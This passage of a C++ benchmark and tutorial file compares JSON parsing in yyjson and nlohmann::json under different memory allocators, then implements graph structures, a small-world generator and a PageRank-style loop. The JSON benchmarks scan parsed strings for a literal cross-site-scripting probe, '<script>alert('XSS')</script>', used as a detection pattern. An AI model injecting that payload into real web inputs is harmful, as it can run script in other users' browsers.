    //    char yyjson_buffer[4096];
    //    yyjson_alc_pool_init(&alc, yyjson_buffer, sizeof(yyjson_buffer));
    //
    using arena_t = arena_t;
    arena_t arena;

    // Repeat the checks many times
    std::size_t bytes_processed = 0;
    std::size_t peak_usage = 0;
    std::size_t count_calls = 0;
    std::size_t max_alloc = 0;
    std::size_t iteration = 0;
    for (auto _ : state) {

        std::string_view packet_json = packets_json[iteration++ % 3];
        bytes_processed += packet_json.size();

        yyjson_read_err error;
        std::memset(&error, 0, sizeof(error));

        yyjson_alc alc = alc_wrapper(arena);
        yyjson_doc *doc = yyjson_read_opts(                 //
            (char *)packet_json.data(), packet_json.size(), //
            YYJSON_READ_NOFLAG, &alc, &error);
        if (!error.code) bm::DoNotOptimize(contains_xss_in_yyjson(yyjson_doc_get_root(doc)));
        peak_usage = std::max(peak_usage, arena.total_allocated);
        count_calls = std::max(count_calls, arena.unique_allocs);
        max_alloc = std::max(max_alloc, arena.max_alloc_size);
        yyjson_doc_free(doc);
    }
    state.SetBytesProcessed(bytes_processed);

    if (peak_usage) {
        state.counters["peak_usage"] = bm::Counter(peak_usage, bm::Counter::kAvgThreads);
        state.counters["mean_alloc"] = bm::Counter(peak_usage * 1.0 / count_calls, bm::Counter::kAvgThreads);
        state.counters["max_alloc"] = bm::Counter(max_alloc, bm::Counter::kAvgThreads);
    }
}

BENCHMARK_CAPTURE(json_yyjson, malloc, yyjson_wrap_malloc)->MinTime(10)->Name("json_yyjson<malloc>");
BENCHMARK_CAPTURE(json_yyjson, malloc, yyjson_wrap_malloc)
    ->MinTime(10)
    ->Name("json_yyjson<malloc>")
    ->Threads(physical_cores());

BENCHMARK_CAPTURE(json_yyjson, prepend, yyjson_wrap_arena_prepend)->MinTime(10)->Name("json_yyjson<arena, prepend>");
BENCHMARK_CAPTURE(json_yyjson, prepend, yyjson_wrap_arena_prepend)
    ->MinTime(10)
    ->Name("json_yyjson<arena, prepend>")
    ->Threads(physical_cores());

#if defined(__x86_64__) || defined(__i386__) // On Arm checking for support is much more complex
#if !defined(__LA57__)                       // On x86-64, the Linux kernel can disable the 5-level paging
BENCHMARK_CAPTURE(json_yyjson, tag, yyjson_wrap_arena_tag)->MinTime(10)->Name("json_yyjson<arena, tag>");
BENCHMARK_CAPTURE(json_yyjson, tag, yyjson_wrap_arena_tag)
    ->MinTime(10)
    ->Name("json_yyjson<arena, tag>")
    ->Threads(physical_cores());
#endif // !defined(__LA57__)
#endif // defined(__x86_64__) || defined(__i386__)

/**
 *  The `nlohmann::json` library is designed to be simple and easy to use, but it's
 *  not the most efficient or flexible. This should be clear even from the interface
 *  level. Let's design a small `std::allocator` alternative, similar to STL's
 *  polymorphic allocator, but with a fixed buffer arena and avoiding all of the
 *  `virtual` nonsense :)
 */
#define JSON_NO_IO 1
#include <nlohmann/json.hpp>
template <template <typename> typename allocator_>

struct json_containers_for_alloc {
    // Must allow `map<Key, Value, typename... Args>`, replaces `std::map`
    template <typename key_type_, typename value_type_, typename...>
    using object = std::map<key_type_, value_type_, std::less<>, allocator_<std::pair<key_type_ const, value_type_>>>;

    // Must allow `vector<Value, typename... Args>`, replaces `std::vector`
    template <typename value_type_, typename...>
    using array = std::vector<value_type_, allocator_<value_type_>>;

    using string = std::basic_string<char, std::char_traits<char>, allocator_<char>>;
};

template <template <typename> typename allocator_>
using json_with_alloc = nlohmann::basic_json<               //
    json_containers_for_alloc<allocator_>::template object, // JSON object
    json_containers_for_alloc<allocator_>::template array,  // JSON array
    typename json_containers_for_alloc<allocator_>::string, // string type
    bool,                                                   // boolean type
    std::int64_t,                                           // integer type
    std::uint64_t,                                          // unsigned type
    double,                                                 // float type
    allocator_,                                             // must allow `allocator<Value>`, replaces `std::allocator`
    nlohmann::adl_serializer,                               // must allow `serializer<Value>`
    std::vector<std::uint8_t, allocator_<std::uint8_t>>,    // binary type
    void                                                    // custom base class
    >;

/**
 *  The `allocate_from_arena` and `deallocate_from_arena` are fairly elegant and simple.
 *  But we have no way of supplying our `arena_t` instance to the `nlohmann::json`
 *  library and it has no mechanism internally to propagate the allocator state to the nested
 *  containers:
 *
 *      switch (t) {
 *          case value_t::object: {
 *              AllocatorType<object_t> alloc;
 *              std::allocator_traits<decltype(alloc)>::destroy(alloc, object);
 *              std::allocator_traits<decltype(alloc)>::deallocate(alloc, object, 1);
 *              break;
 *          }
 *          case value_t::array: {
 *              ...
 *
 *  So with `nlohmann::json` we are forced to use some singleton @b `thread_local` state,
 *  which is an immediate @b code-smell, while with `yyjson` we can pass a context object down!
 */

thread_local arena_t thread_local_arena;

template <typename value_type_>
struct arena_allocator {
    using value_type = value_type_;

    arena_allocator() noexcept = default;

    template <typename other_type_>
    arena_allocator(arena_allocator<other_type_> const &) noexcept {}

    value_type *allocate(std::size_t n) noexcept(false) {
        if (auto ptr = allocate_from_arena(thread_local_arena, n * sizeof(value_type)); ptr)
            return reinterpret_cast<value_type *>(ptr);
        else
            throw std::bad_alloc();
    }

    void deallocate(value_type *ptr, std::size_t n) noexcept {
        deallocate_from_arena(thread_local_arena, reinterpret_cast<std::byte *>(ptr), n * sizeof(value_type));
    }

    // Rebind mechanism and comparators are for compatibility with STL containers
    template <typename other_type_>
    struct rebind {
        using other = arena_allocator<other_type_>;
    };
    bool operator==(arena_allocator const &) const noexcept { return true; }
    bool operator!=(arena_allocator const &) const noexcept { return false; }
};

template <typename json_type_>
bool contains_xss_nlohmann(json_type_ const &j) noexcept {
    if (j.is_object()) {
        for (auto const &it : j.items())
            if (contains_xss_nlohmann(it.value())) return true;
        return false;
    }
    else if (j.is_array()) {
        for (auto const &elem : j)
            if (contains_xss_nlohmann(elem)) return true;
        return false;
    }
    else if (j.is_string()) {
        using string_t = typename json_type_::string_t;
        auto const &s = j.template get_ref<string_t const &>();
        return s.find("<script>alert('XSS')</script>") != string_t::npos;
    }
    else { return false; }
}

using default_json = json_with_alloc<std::allocator>;
using arena_json = json_with_alloc<arena_allocator>;

enum class exception_handling_t { throw_k, noexcept_k };

template <typename json_type_, exception_handling_t exception_handling_>
static void json_nlohmann(bm::State &state) {
    std::size_t bytes_processed = 0;
    std::size_t peak_usage = 0;
    std::size_t count_calls = 0;
    std::size_t max_alloc = 0;
    std::size_t iteration = 0;
    for (auto _ : state) {

        std::string_view packet_json = packets_json[iteration++ % 3];
        bytes_processed += packet_json.size();

        json_type_ json;
        // The vanilla default (recommended) behavior is to throw exceptions on parsing errors.
        // As we know from the error handling benchmarks, exceptions can be extremely slow,
        // if they are thrown frequently.
        if constexpr (exception_handling_ == exception_handling_t::throw_k) {
            try {
                json = json_type_::parse(packet_json);
                bm::DoNotOptimize(contains_xss_nlohmann(json));
            }
            catch (typename json_type_::exception const &e) {
                continue;
            }
        }
        // There is, however, a much nicer way to do it avoiding exceptions.
        // https://json.nlohmann.me/features/parsing/parse_exceptions/#switch-off-exceptions
        //
        else {
            json = json_type_::parse(packet_json, nullptr, false);
            if (!json.is_discarded()) bm::DoNotOptimize(contains_xss_nlohmann(json));
        }
        if constexpr (!std::is_same_v<json_type_, default_json>) {
            peak_usage = std::max(peak_usage, thread_local_arena.total_allocated);
            count_calls = std::max(count_calls, thread_local_arena.unique_allocs);
            max_alloc = std::max(max_alloc, thread_local_arena.max_alloc_size);
        }
    }
    state.SetBytesProcessed(bytes_processed);

    if (peak_usage) {
        state.counters["peak_usage"] = bm::Counter(peak_usage, bm::Counter::kAvgThreads);
        state.counters["mean_alloc"] = bm::Counter(peak_usage * 1.0 / count_calls, bm::Counter::kAvgThreads);
        state.counters["max_alloc"] = bm::Counter(max_alloc, bm::Counter::kAvgThreads);
    }
}

BENCHMARK(json_nlohmann<default_json, exception_handling_t::throw_k>)
    ->MinTime(10)
    ->Name("json_nlohmann<std::allocator, throw>");
BENCHMARK(json_nlohmann<arena_json, exception_handling_t::throw_k>)
    ->MinTime(10)
    ->Name("json_nlohmann<arena_allocator, throw>");
BENCHMARK(json_nlohmann<default_json, exception_handling_t::noexcept_k>)
    ->MinTime(10)
    ->Name("json_nlohmann<std::allocator, noexcept>");
BENCHMARK(json_nlohmann<arena_json, exception_handling_t::noexcept_k>)
    ->MinTime(10)
    ->Name("json_nlohmann<arena_allocator, noexcept>");
BENCHMARK(json_nlohmann<default_json, exception_handling_t::throw_k>)
    ->MinTime(10)
    ->Name("json_nlohmann<std::allocator, throw>")
    ->Threads(physical_cores());
BENCHMARK(json_nlohmann<arena_json, exception_handling_t::throw_k>)
    ->MinTime(10)
    ->Name("json_nlohmann<arena_allocator, throw>")
    ->Threads(physical_cores());
BENCHMARK(json_nlohmann<default_json, exception_handling_t::noexcept_k>)
    ->MinTime(10)
    ->Name("json_nlohmann<std::allocator, noexcept>")
    ->Threads(physical_cores());
BENCHMARK(json_nlohmann<arena_json, exception_handling_t::noexcept_k>)
    ->MinTime(10)
    ->Name("json_nlohmann<arena_allocator, noexcept>")
    ->Threads(physical_cores());

/**
 *  The results for the single-threaded case and the multi-threaded case without
 *  Simultaneous Multi-Threading @b (SMT), with 96 threads on 96 Sapphire Rapids
 *  cores, are as follows:
 *
 *  - `json_yyjson<malloc>`:                       @b 359 ns       @b 369 ns
 *  - `json_yyjson<arena>`:                        @b 326 ns       @b 326 ns
 *  - `json_nlohmann<std::allocator, throw>`:      @b 6'440 ns     @b 11'821 ns
 *  - `json_nlohmann<arena_allocator, throw>`:     @b 6'041 ns     @b 11'601 ns
 *  - `json_nlohmann<std::allocator, noexcept>`:   @b 4'741 ns     @b 11'512 ns
 *  - `json_nlohmann<arena_allocator, noexcept>`:  @b 4'316 ns     @b 12'209 ns
 *
 *  The reason, why `yyjson` numbers are less affected by the allocator change,
 *  is because it doesn't need many dynamic allocations. It manages a linked list
 *  of arena's just like the static one we've allocated on stack:
 *
 *      #define YYJSON_ALC_DYN_MIN_SIZE 0x1000 // 4 KB
 *
 *  Some of Unum's libraries, like `usearch` can take multiple allocators for
 *  different parts of a complex hybrid data-structure with clearly divisible
 *  memory management patterns. A.k.a. part of the structure is append-only,
 *  and another part is frequently modified, but only in fixed-size blocks,
 *  perfect for an "arena" allocator.
 *
 *  If you are ambitious enough to build advanced memory allocators, check
 *  out the implementation of `jemalloc`, `mimalloc`, `tcmalloc`, and `hoard`.
 *
 *  @see Heap Layers project by Emery Berger: https://github.com/emeryberger/Heap-Layers
 *
 *  If you want to learn more about data-serialization, read about Google's Protocol
 *  Buffers often called @b protobuf, as well as Cloudflare's Cap'n Proto, and MsgPack.
 *  Just remember, the most common solution is definitely not the best one in this case ;)
 *
 *  @see ProtoBuf's issues discussion on HackerNews: https://news.ycombinator.com/item?id=26931581
 */

#pragma endregion // JSON, Allocators, and Designing Complex Containers

#pragma region Trees, Graphs, and Data Layouts
/**
 *  We already understand the cost of accessing non-contiguous memory, cache misses,
 *  pointer chasing, split loads, data locality, and even parallelism, and asynchrony,
 *  but it's not the same as concurrency and concurrent data-structures.
 *
 *  Let's imagine a somewhat realistic app, analyzing a @b sparse_weighted_undirected_graph
 *  structure, with a Page-Rank-like algorithm:
 *
 *  1. Typical weighted directed graph structure, built on nested @b `std::unordered_map`s.
 *  2. Cleaner, single-level @b `std::map` with transparent comparison function.
 *  3. Flat design on top of a @b `absl::flat_hash_set` of tuples, taking the best of 2 and 3.
 *
 *  In code, a simplified implementation may look like:
 *
 *  1. @b `std::unordered_map <std::uint16_t, std::unordered_map<std::uint16_t, float>>`
 *  2. @b `std::map <std::pair<std::uint16_t, std::uint16_t>, float, ...>`
 *  3. @b `absl::flat_hash_set <std::tuple<std::uint16_t, std::uint16_t, float>, ...>`
 *
 *  Moreover, this is the perfect place to explore, how a memory allocator can be
 *  passed down to the data-structure, and how it can be used to optimize the memory
 *  management of the graph.
 *
 *  We will define the following APIs:
 *
 *  - `upsert_edge(from, to, weight)`: Inserts or updates an existing edge between two vertices.
 *  - `get_edge(from, to)`: Retrieves the `std::optional` weight of the edge between two vertices.
 *  - `remove_edge(from, to)`: Removes the edge between two vertices, if present.
 *  - `for_edges(from, visitor)`: Applies a callback to all edges starting from a vertex.
 *  - `size()`: Returns the number of vertices and edges in the graph.
 *  - `reserve(capacity)`: Reserves memory for the given number of vertices.
 *  - `compact()`: Compacts the memory layout of the graph, preparing for read-intensive workloads.
 *
 *  None of the interfaces raise exceptions directly, but will propagate the exceptions
 *  of the underlying associative container for now.
 *
 *  @see "Designing a Fast, Efficient, Cache-friendly Hash Table, Step by Step"
 *       by Matt Kulukundis at CppCon 2017: https://youtu.be/ncHmEUmJZf4
 */
#include <map> // `std::map`

using vertex_id_t = std::uint16_t; // 65'536 vertex IDs should be enough for everyone :)
using edge_weight_t = float;       // Weights are typically floating-point numbers

struct graph_size_t {
    std::size_t vertices = 0;
    std::size_t edges = 0;
};

/**
 *  The most common way to define a sparse graph in C++ applications is to use
 *  a two-level nested associative container (like `std::unordered_map` or `std::map`).
 *
 *     struct basic_graph_unordered_maps {
 *         std::unordered_map<vertex_id_t, std::unordered_map<vertex_id_t, edge_weight_t>> vertices_;
 *     };
 *
 *  That's not great, assuming the memory allocations happen independently for each
 *  vertex, and the memory layout is not contiguous. Let's generalize it to arbitrary
 *  memory allocators and propagate the parent allocator state to the child containers.
 *
 *  Assuming the `unordered_map` will store the state of the allocator internally, we
 *  don't need to add a separate member field in the `basic_graph_unordered_maps` structure...
 *  But if we were to add one - there is a @b `[[no_unique_address]]` attribute in C++20,
 *  which can be used in such cases to save space!
 *
 *  @see No-Unique-Address attribute: https://en.cppreference.com/w/cpp/language/attributes/no_unique_address
 */
template <typename allocator_type_ = std::allocator<std::byte>>
struct basic_graph_unordered_maps {

    using allocator_type = allocator_type_;
    using equal_t = std::equal_to<vertex_id_t>; // Equality check for vertex IDs
    using hash_t = std::hash<vertex_id_t>;      // Hash function for vertex IDs

    using inner_allocator_type = typename std::allocator_traits<allocator_type_>::template rebind_alloc<
        std::pair<vertex_id_t const, edge_weight_t>>;
    using inner_map_type = std::unordered_map<vertex_id_t, edge_weight_t, hash_t, equal_t, inner_allocator_type>;
    using outer_allocator_type = typename std::allocator_traits<allocator_type_>::template rebind_alloc<
        std::pair<vertex_id_t const, inner_map_type>>;
    using outer_map_type = std::unordered_map<vertex_id_t, inner_map_type, hash_t, equal_t, outer_allocator_type>;

    outer_map_type vertices_;

    explicit basic_graph_unordered_maps(allocator_type const &alloc = allocator_type()) noexcept(false)
        : vertices_(0, hash_t {}, equal_t {}, alloc) {}

    void reserve(graph_size_t capacity) noexcept(false) { vertices_.reserve(capacity.vertices); }

    graph_size_t size() const noexcept {
        graph_size_t size;
        size.vertices = vertices_.size();
        for (auto const &[_, inner] : vertices_) size.edges += inner.size();
        return size;
    }

    void upsert_edge(vertex_id_t from, vertex_id_t to, edge_weight_t weight) noexcept(false) {
        if (from == to) return; // Skip self-loop

        // Now inserting a new edge should be trivial, right? Maybe something like this:
        //
        //      vertices_[from][to] = weight, vertices_[to][from] = weight;
        //
        // That, however, hides the inner map allocation logic, and we can't propagate
        // the allocator state down to the inner map. So we have to do it manually:
        auto it = vertices_.find(from);
        if (it == vertices_.end())
            it = vertices_
                     .emplace( //
                         std::piecewise_construct, std::forward_as_tuple(from),
                         std::forward_as_tuple(         //
                             1,                         // At least one bucket for the new entry
                             vertices_.hash_function(), // The parent's hash function
                             vertices_.key_eq(),        // The parent's equality check
                             vertices_.get_allocator()  // The parent's run-time allocator:
                             ))
                     .first;
        it->second[to] = weight;

        // Repeat in the opposite direction:
        it = vertices_.find(to);
        if (it == vertices_.end())
            it = vertices_
                     .emplace( //
                         std::piecewise_construct, std::forward_as_tuple(to),
                         std::forward_as_tuple(         //
                             1,                         // At least one bucket for the new entry
                             vertices_.hash_function(), // The parent's hash function
                             vertices_.key_eq(),        // The parent's equality check
                             vertices_.get_allocator()  // The parent's run-time allocator:
                             ))
                     .first;
        it->second[from] = weight;
    }

    std::optional<edge_weight_t> get_edge(vertex_id_t from, vertex_id_t to) const noexcept {
        if (auto it = vertices_.find(from); it != vertices_.end())
            if (auto jt = it->second.find(to); jt != it->second.end()) return jt->second;
        return std::nullopt;
    }

    void remove_edge(vertex_id_t from, vertex_id_t to) noexcept {
        // It's unlikely that we are removing a non-existent edge
        if (auto it = vertices_.find(from); it != vertices_.end()) [[likely]]
            it->second.erase(to);
        if (auto it = vertices_.find(to); it != vertices_.end()) [[likely]]
            it->second.erase(from);
    }

    void compact() noexcept(false) {
        // The `std::unordered_map::rehash(0)` may be used to force an unconditional rehash,
        // such as after suspension of automatic rehashing by temporarily increasing `max_load_factor()`.
        vertices_.rehash(0);
        for (auto &[_, inner] : vertices_) inner.rehash(0);
    }

    template <typename visitor_type_>
    void for_edges(vertex_id_t from, visitor_type_ visitor) const noexcept {
        if (auto it = vertices_.find(from); it != vertices_.end())
            for (auto const &[to, weight] : it->second) visitor(from, to, weight);
    }
};

/**
 *  Assuming the graph is sparse, the size of the inner containers will differ greatly.
 *  We can balance the situation by flattening our 2-level construction into a single
 *  associative container, with a custom @b `less_t` comparison function.
 *
 *      struct basic_graph_map {
 *          struct less_t {
 *              using is_transparent = std::true_type;
 *              bool operator()(vertex_ids_t const &, vertex_ids_t const &) const noexcept { ... }
 *              bool operator()(vertex_id_t, vertex_ids_t const &) const noexcept { ... }
 *              bool operator()(vertex_ids_t const &, vertex_id_t) const noexcept { ... }
 *          }
 *          std::map<vertex_ids_t, edge_weight_t, less_t> edges_;
 *      };
 *
 *  The comparison function object must define @b `is_transparent` and support not only
 *  a comparison between two keys (`vertex_ids_t` in this case), but also between a key
 *  and an arbitrary "search key" that will be used for lookups (like `vertex_id_t`).
 *
 *  Assuming `std::map` is a strictly ordered Binary Search Tree @b (BST), usually
 *  a Red-Black Tree, we can order it in the lexigraphical order of the `(from, to)` pairs,
 *  and use @b `std::map::equal_range` to iterate over all edges starting from a given vertex.
 *
 *  ? Even though our data-structure contains "edges" as opposed to "vertices + their edges",
 *  ? the fact that all edges are flattened and ordered by the source vertex ID, allows us
 *  ? to reuse this structure in both "vertex-centric" and "edge-centric" algorithms.
 *
 *  We can use C++20 three-way comparison operator @b `<=>` to define the comparison
 *  functions just once per "other type", and the default `std::less` will automatically
 *  work. Comparing with another `vertex_ids_t` is straightforward, and will result in a
 *  @b `std::strong_ordering`, while comparing with a `vertex_id_t` will result in a less
 *  strict @b `std::weak_ordering`.
 */
#include <compare>       // `std::weak_ordering`
#include <tuple>         // `std::tie`
#include <unordered_map> // `std::unordered_map`

struct vertex_ids_t {
    vertex_id_t from, to;

    std::strong_ordering operator<=>(vertex_ids_t other) const noexcept {
        return std::tie(from, to) <=> std::tie(other.from, other.to);
    }
    std::weak_ordering operator<=>(vertex_id_t other) const noexcept { return from <=> other; }
};

template <typename allocator_type_ = std::allocator<std::byte>>
struct basic_graph_map {

    using allocator_type = allocator_type_;
    using compare_t = std::less<>;
    using map_allocator_type = typename std::allocator_traits<allocator_type_>::template rebind_alloc<
        std::pair<vertex_ids_t const, edge_weight_t>>;
    using map_type = std::map<vertex_ids_t, edge_weight_t, compare_t, map_allocator_type>;

    map_type edges_;

    void reserve([[maybe_unused]] graph_size_t) noexcept {
        //! The `std::map` doesn't support `reserve` 🤕
    }

    graph_size_t size() const noexcept {
        if (edges_.empty()) return {};
        graph_size_t size;
        // The number of edges is half the container size, as we store each edge twice.
        size.edges = edges_.size() / 2;
        // Assuming all the edges are ordered by their source vertex ID,
        // we can iterate through tuples and check, how many unique vertices we have.
        size.vertices = 1;
        auto it = edges_.begin();
        auto last_id = it->first.from;
        while (++it != edges_.end())
            if (it->first.from != last_id) ++size.vertices, last_id = it->first.from;
        return size;
    }

    void upsert_edge(vertex_id_t from, vertex_id_t to, edge_weight_t weight) noexcept(false) {
        if (from == to) return; // Skip self-loop
        edges_.emplace(vertex_ids_t(from, to), weight);
        edges_.emplace(vertex_ids_t(to, from), weight);
    }

    std::optional<edge_weight_t> get_edge(vertex_id_t from, vertex_id_t to) const noexcept {
        if (auto it = edges_.find(vertex_ids_t(from, to)); it != edges_.end()) return it->second;
        return std::nullopt;
    }

    void remove_edge(vertex_id_t from, vertex_id_t to) noexcept {
        edges_.erase(vertex_ids_t(from, to));
        edges_.erase(vertex_ids_t(to, from));
    }

    void compact() noexcept {
        // The `std::map` is already a balanced BST, so no need to do anything here.
    }

    template <typename visitor_type_>
    void for_edges(vertex_id_t from, visitor_type_ visitor) const noexcept {
        auto [begin, end] = edges_.equal_range(from);
        for (auto it = begin; it != end; ++it) visitor(from, it->first.to, it->second);
    }
};

/**
 *  During construction, we need fast lookups and insertions - so a single-level hash-map
 *  would be the best choice. But during processing, we need to iterate over all edges
 *  starting from a given vertex, and with non-flat hash-map and a typical hash function,
 *  the iteration would be slow.
 *
 *  Instead, we can override the hash function to only look at source vertex ID, but use
 *  both identifiers for equality comparison. Assuming that hash function is highly
 *  unbalanced for a sparse graph, we need to pre-allocate more memory.
 *
 *  ! Sadly, the `absl::flat_hash_set` doesn't yet support the three-way comparison operator,
 *  ! so we are manually defining the `equal_t` for every possible pair of arguments.
 */

#include <absl/container/flat_hash_set.h> // `absl::flat_hash_set`
#include <absl/hash/hash.h>               // `absl::Hash`

struct edge_t {
    vertex_id_t from;
    vertex_id_t to;
    edge_weight_t weight;

    //! NVCC's `std::construct_at` requires those default constructors
    constexpr edge_t() noexcept = default;
    constexpr edge_t(edge_t const &) noexcept = default;
    constexpr edge_t(vertex_id_t from, vertex_id_t to, edge_weight_t weight) noexcept
        : from(from), to(to), weight(weight) {}
};

static_assert( //
    sizeof(edge_t) == sizeof(vertex_id_t) + sizeof(vertex_id_t) + sizeof(edge_weight_t),
    "With a single-level flat structure we can guarantee structure packing");

template <typename allocator_type_ = std::allocator<std::byte>>
struct basic_graph_flat_set {

    struct equal_t {
        using is_transparent = std::true_type;
        bool operator()(edge_t const &lhs, edge_t const &rhs) const noexcept {
            return lhs.from == rhs.from && lhs.to == rhs.to;
        }
        bool operator()(vertex_id_t lhs, edge_t const &rhs) const noexcept { return lhs == rhs.from; }
        bool operator()(edge_t const &lhs, vertex_id_t rhs) const noexcept { return lhs.from == rhs; }
        bool operator()(edge_t const &lhs, vertex_ids_t const &rhs) const noexcept {
            return lhs.from == rhs.from && lhs.to == rhs.to;
        }
        bool operator()(vertex_ids_t const &lhs, edge_t const &rhs) const noexcept {
            return lhs.from == rhs.from && lhs.to == rhs.to;
        }
    };

    struct hash_t {
        using is_transparent = std::true_type;
        std::size_t operator()(vertex_id_t from) const noexcept { return absl::Hash<vertex_id_t> {}(from); }
        std::size_t operator()(edge_t const &edge) const noexcept { return absl::Hash<vertex_id_t> {}(edge.from); }
        std::size_t operator()(vertex_ids_t const &pair) const noexcept {
            return absl::Hash<vertex_id_t> {}(pair.from);
        }
    };

    using allocator_type = allocator_type_;
    using set_allocator_type = typename std::allocator_traits<allocator_type>::template rebind_alloc<allocator_type>;
    using flat_set_type = absl::flat_hash_set<edge_t, hash_t, equal_t, set_allocator_type>;

    flat_set_type edges_;

    explicit basic_graph_flat_set(allocator_type const &alloc = allocator_type()) noexcept(false)
        : edges_(0 /* bucket_count */, hash_t {}, equal_t {}, alloc) {}

    void reserve(graph_size_t capacity) noexcept(false) {
        // Assuming the irregular structure of our graph, it's a great idea to "over-provision"
        // memory by changing the `max_load_factor` to a lower value, like 0.5, to reduce the
        // number of unsuccessful probes.
        //
        // That operation, however, is a no-op in Abseil and is only provided for compatibility
        // with the STL, so we resort to a much more blunt approach - reserving a large number
        // of slots 🤦‍♂️
        edges_.reserve(capacity.edges * 2);
    }

    graph_size_t size() const noexcept {
        graph_size_t size;
        size.edges = edges_.size();
        size.vertices = 0;
        for (auto const &edge : edges_) size.vertices = std::max(size.vertices, edge.from);
        return size;
    }

    void upsert_edge(vertex_id_t from, vertex_id_t to, edge_weight_t weight) noexcept(false) {
        if (from == to) return; // Skip self-loop
        edges_.emplace(from, to, weight);
        edges_.emplace(to, from, weight);
    }

    std::optional<edge_weight_t> get_edge(vertex_id_t from, vertex_id_t to) const noexcept {
        if (auto it = edges_.find(edge_t {from, to, 0.0f}); it != edges_.end()) return it->weight;
        return std::nullopt;
    }

    void remove_edge(vertex_id_t from, vertex_id_t to) noexcept {
        edges_.erase(vertex_ids_t(from, to));
        edges_.erase(vertex_ids_t(to, from));
    }

    void compact() noexcept(false) {
        // Erasing does not trigger a rehash, so we do it manually:
        edges_.rehash(0);
    }

    template <typename visitor_type_>
    void for_edges(vertex_id_t from, visitor_type_ visitor) const noexcept {
        auto [begin, end] = edges_.equal_range(from);
        for (auto it = begin; it != end; ++it) visitor(it->from, it->to, it->weight);
    }
};

/**
 *  Now we have 3 fairly generic implementations that will behave differently based on
 *  the underlying associative container, memory allocator used, the shape of the graph,
 *  and countless other parameters!
 *
 *  Let's consider a Small World graph of a community of 2'500 people, a typical upper
 *  bound for what is considered a "village", with roughly 200 connections per person,
 *  the Dunbar's number.
 */
constexpr std::size_t graph_vertices_count_k = 2'500;
constexpr std::size_t graph_vertices_degree_k = 200;

enum class graph_allocation_mode_t { global_k, arena_k };
enum class graph_compaction_mode_t { disabled_k, enabled_k };
enum class execution_mode_t { serial_k, parallel_k };

#include <cassert> // `assert`
#include <random>  // `std::mt19937_64`
#include <span>    // `std::span`

/**
 *  @brief  Generates a Watts-Strogatz small-world graph forming a ring lattice
 *          with `k` neighbors per vertex and rewiring probability `p`.
 *
 *  @param[out] graph The graph to be generated.
 *  @param[inout] generator Random number generator to be used.
 *  @param[in] vertices Node IDs to be used in the graph.
 *  @param[in] k Number of neighbors per vertex.
 *  @param[in] p Rewiring probability to modify the initial ring lattice, default 0.1.
 */
template <typename graph_type_>
void watts_strogatz(                                //
    graph_type_ &graph, std::mt19937_64 &generator, // Mutable in/out parameters
    std::span<vertex_id_t const> vertices,          // Immutable input parameters
    std::size_t const k, float const p = 0.1f) {    // Configuration parameters

    auto const n = vertices.size();
    assert(k < n && "k should be smaller than n");
    assert(k % 2 == 0 && "k should be even for symmetrical neighbors");

    // We'll use a Mersenne Twister random number generator,
    // reusing it for different distributions.
    std::uniform_real_distribution<float> distribution_probability(0.0f, 1.0f);
    std::uniform_real_distribution<edge_weight_t> distribution_weight(0.0f, 1.0f);
    std::uniform_int_distribution<vertex_id_t> distribution_vertices(0, static_cast<vertex_id_t>(n - 1));

    // The ring lattice has `n * (k / 2)` edges if we only add `j>i`.
    // Then each edge is stored twice in adjacency for undirected.
    graph.reserve({n, n * k});

    // Build the initial ring lattice:
    for (std::size_t i = 0; i < n; ++i) {
        // Connect `i` to `{i+1, i+2, ... (i + k/2) % n}
        for (std::size_t offset = 1; offset <= k / 2; ++offset) {
            std::size_t j = (i + offset) % n;
            if (j <= i) continue; // If j < i, it will come up in its own iteration
            edge_weight_t w = distribution_weight(generator);
            graph.upsert_edge(vertices[i], vertices[j], w);
        }
    }

    // Rewire edges with probability `p`
    for (std::size_t i = 0; i < n; ++i) {
        for (std::size_t offset = 1; offset <= k / 2; ++offset) {
            std::size_t j = (i + offset) % n;
            if (j <= i) continue; // If j < i, it will come up in its own iteration
            // With probability `p`, remove `(i, j)` and add some new `(i, m)`
            if (distribution_probability(generator) >= p) continue;
            // Remove the old edge `(i, j)`
            graph.remove_edge(vertices[i], vertices[j]);
            vertex_id_t m;
            do { m = distribution_vertices(generator); } while (graph.get_edge(vertices[i], vertices[m]));
            edge_weight_t w = distribution_weight(generator);
            graph.upsert_edge(vertices[i], vertices[m], w);
        }
    }
}

/**
 *  @brief  Produces a non-repeating sorted (monotonically increasing) sequence of vertex IDs.
 *  @param[in] size The number of unique vertex IDs to generate.
 */
std::vector<vertex_id_t> make_vertex_ids(std::mt19937_64 &generator, std::size_t size) noexcept(false) {
    std::set<vertex_id_t> ids;
    std::uniform_int_distribution<vertex_id_t> distribution(0, std::numeric_limits<vertex_id_t>::max());
    while (ids.size() < size) ids.insert(distribution(generator));
    return {ids.begin(), ids.end()};
}

template <                       //
    execution_mode_t execution_, //
    typename graph_type_>        // This parameter can be inferred, so put it last ;)

void page_rank(                                                        //
    graph_type_ const &graph, std::span<vertex_id_t const> vertex_ids, //
    std::span<float> old_scores, std::span<float> new_scores,          //
    std::size_t const iterations, float const damping = 0.85f) {

    std::size_t iterations_left = iterations;
    while (iterations_left--) {
        float total_score = 0.0f;
        for (std::size_t i = 0; i < vertex_ids.size(); ++i) {
            vertex_id_t vertex_id = vertex_ids[i];
            float &old_score = old_scores[i];
            float &new_score = new_scores[i];
            float replacing_score = 0.0f;
            graph.for_edges(vertex_id, [&](vertex_id_t from, vertex_id_t to, edge_weight_t weight) {
                std::size_t j = std::lower_bound(vertex_ids.begin(), vertex_ids.end(), to) - vertex_ids.begin();
                replacing_score += old_scores[j] * weight;
            });
            new_score = replacing_score;
            total_score += replacing_score;
        }
        // Normalize the scores and apply damping
        for (std::size_t i = 0; i < vertex_ids.size(); ++i)
            new_scores[i] = (1.0f - damping) + damping * new_scores[i] / total_score;
        std::swap(old_scores, new_scores);
    }
}

/**
 *  @brief  Benchmarks building a Watts-Strogatz small-world graph.
 *
 *  @tparam allocation_mode_ Do we allocate from the default global allocator or an arena?
 *  @tparam compaction_mode_ Do we compact the graph after construction or not?
 *
 *  @param[out] graph The graph to be generated.
 *  @param[inout] generator Random number generator to be used.
 *  @param[in] vertices Node IDs to be used in the graph.
 *  @param[in] k Number of neighbors per vertex.
 *  @param[in] p Rewiring probability to modify the initial ring lattice.
 */
template <                                                                    //
    typename graph_type_,                                                     //
    graph_allocation_mode_t allocation_ = graph_allocation_mode_t::global_k,  //
    graph_compaction_mode_t compaction_ = graph_compaction_mode_t::disabled_k //
    >

static void graph_make(bm::State &state) {

    // Seed all graph types identically
    std::mt19937_64 generator(42);
